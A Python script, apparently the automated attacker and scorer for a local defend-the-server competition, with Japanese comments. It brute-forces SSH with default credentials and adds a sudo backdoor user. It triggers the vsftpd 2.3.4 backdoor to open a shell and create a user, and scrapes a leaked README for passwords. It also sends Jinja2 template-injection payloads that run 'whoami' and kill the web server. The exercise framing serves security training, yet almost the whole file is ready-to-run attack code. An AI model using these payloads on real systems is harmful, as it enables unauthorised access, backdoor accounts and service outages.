import time
from time import sleep
import requests
import threading
import warnings
warnings.filterwarnings('ignore')
from telnetlib import Telnet
import argparse
import sys
import time

import m1_brute

# スコアボードのアドレス
scoreboard = "localhost:5000"
# 攻撃対象のアドレス
target = "127.0.0.1"


# port = 10000 + 1000 * team_id + ports["ssh"]
ports = {
	"ftp": 21,
	"ssh": 22,
	"http1": 80,
	"http2": 81,
	"vsftpd": 62,
}

def sleep_until(t):
	print("============================")
	time.sleep(t)


def chk_alive(team):
	team = int(team)
	port = 10000 + 1000 * team + ports["http1"]
	q = "http://" + target + ":" + str(port)
	try:
		r = requests.get(q, timeout=2)
		print("team", team, "is alive: ", q)
		return True
	except:
		print("\033[31mteam", team, "is dead: ", q ,"\033[0m")
		return False

# スコアの加算は「http://IP/add?team=ID&score=SCORE」で行う
def add_score(team, points):
	team = str(team)
	points = str(points)
	try:
		q = "http://" + scoreboard + "/add?team=" + team + "&score=" + points
		requests.get(q)
		print("team", team, "got points:", points)
	except:
		pass

def brute_force(team_id):
	cmd = 'useradd sg && echo "sg:sg" | chpasswd && usermod -aG sudo sg'
	exploit = "echo root | su - root -c \"pkill -f 'python3 /var/www/html/webapp/app.py'\""
	res = []
	port = 10000 + 1000 * team_id + ports["ssh"]
	res.append(m1_brute.sshc(team_id, target, port, "root", "root", cmd))
	res.append(m1_brute.sshc(team_id, target, port, "user11", "pass", cmd))
	res.append(m1_brute.sshc(team_id, target, port, "user1", "user1", cmd))
	res.append(m1_brute.sshc(team_id, target, port, "user6", "user6", cmd))
	m1_brute.sshc(team_id, target, port, "sg", "sg", exploit)
	if True in res:
		return
	else:
		add_score(team_id, 50) # SSHのブルートフォースによる攻撃を防いだ
	print("cheking server status", team_id)
	if chk_alive(team_id):
		add_score(team_id, 50) # WEBサーバーを停止されなかった

def run(team_id, host):
	portFTP = 10000 + 1000 * team_id + ports["ftp"]
	lp = 10000 + 1000 * team_id + ports["vsftpd"]
	user = "USER ayato:)"
	password = "PASS pass"
	time.sleep(2)
	try:
		tn = Telnet(host,portFTP,3)
		time.sleep(1)
		tn.read_until(b"(vsFTPd 2.3.4)")
		tn.write(user.encode('ascii') + b"\n")
		tn.read_until(b"password.")
		tn.write(password.encode('ascii') + b"\n")
		tn.close()
		print("\033[31mteam", team_id, host + ":" + str(portFTP), "vsftpd was hacked: connected\033[0m")
	except:
		print("team", team_id, host + ":" + str(portFTP), "vsftpd was not hacked")
		add_score(team_id, 50) # vsftpdの脆弱性を利用した接続を防いだ
	try:
		time.sleep(5)
		tn2 = Telnet(host, lp, 3)
		tn2.write(b'useradd test && echo "test:test" | chpasswd\n')
	except:
		pass
	# test ユーザーが作成されているか確認
	if m1_brute.sshc(team_id, target, 10000 + 1000 * team_id + ports["ssh"], "test", "test", "") != False:
		print("\033[31mteam",team_id, host + ":" + str(lp), "vsftpd was hacked: created `test` user\033[0m")
	else:
		print("team", team_id, host + ":" + str(lp), "vsftpd was not hacked")
		add_score(team_id, 100) # vsftpdの脆弱性を利用した攻撃を防いだ

def cred_attack(team_id):
	port = 10000 + 1000 * team_id + ports["http2"]
	u = "http://" + target + ":" + str(port) + "/README.md"
	try:
		res = requests.get(u, timeout=(6, 7))
		sleep_until(5)
		if res.status_code == 200:
			if "dev" in res.text and "devpass123" in res.text:
				print("\033[31mteam", team_id, target + ":" + str(port) ,"has credential file: ", u,"\033[0m")
			else:
				add_score(team_id, 100) # クレデンシャル情報が流出したが、不正な通信がおこらなかった
				print("team", team_id, target + ":" + str(port), "could not get hacked")
		else:
			add_score(team_id, 150) # クレデンシャル情報が流出しなかった
			print("team", team_id, target + ":" + str(port), "has no credential file: ", u)
	except:
		add_score(team_id, 150) # クレデンシャル情報が流出しなかった
		print("team", team_id, target + ":" + str(port), "could not get credentials")

def web_attack(team_id):
	port = str(10000 + 1000 * team_id + ports["http1"])
	url = "http://" + target + ":" + port
	uri = '/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
	q = (url + uri)

	## SSTI(whoami)の攻撃
	try:
		res = requests.get(q, timeout=(3, 7))
		if "root" in res.text:
			print("\033[31mteam", team_id, target + ":" + port, "has SSTI vuln(whoami):", url, "\033[0m")
		else:
			print("team", team_id, target + ":" + port, "has not SSTI(whoami)")
			add_score(team_id, 100) # SSTIが発生しなかった
	except:
		print("team", team_id, target + ":" + port, "could not connect:", url)
	## SSTI(Stop server)の攻撃
	uri = """/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("pkill -f 'python3 /var/www/html/webapp/app.py'").read()}}"""
	q = (url + uri)
	#print(q)
	try:
		res = requests.get(q, timeout=(3, 7))
		if requests.get(url, timeout=(3, 7)): # 疎通チェック
			print("team", team_id, target + ":" + port, "has not SSTI(Stop server)")
			add_score(team_id, 100) # SSTIが発生しなかった
	except:
		print("\033[31mteam", team_id, target + ":" + port, "has SSTI vuln(Stop server):", url, "\033[0m")

if __name__ == "__main__":
	#ブルートフォース攻撃のテスト
	sleep_until(60 * 10)
	print("====================================")
	for i in range(1, 9):
		threading.Thread(target=brute_force, args=(i,)).start()
	
	# vsftpdの脆弱性を利用した攻撃
	sleep_until(60 * 10)
	print("====================================")
	for i in range(1, 9):
		threading.Thread(target=run, args=(i, target)).start()
	
	# クレデンシャル情報の流出
	sleep_until(60 * 5)
	print("====================================")
	for i in range(1, 9):
		threading.Thread(target=cred_attack, args=(i,)).start()

	# WEBアプリへの攻撃
	sleep_until(60 * 5)
	print("====================================")
	for i in range(1, 9):
		threading.Thread(target=web_attack, args=(i,)).start()
	
